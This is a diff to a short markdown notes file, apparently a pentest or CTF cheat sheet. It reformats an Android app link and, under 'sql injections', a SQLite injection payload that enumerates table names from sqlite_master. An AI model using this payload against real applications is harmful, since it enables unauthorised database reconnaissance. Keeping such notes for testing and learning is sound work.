@@ -2,11 +2,15 @@
 
 ## apps
 
-```https://play.google.com/store/apps/details?id=com.arara.q```
+```
+https://play.google.com/store/apps/details?id=com.arara.q
+```
 
 ## sql injections
 
-- ```' || (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))--```
+```
+' || (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))--
+```
 
 ## Privilege Escalation
 
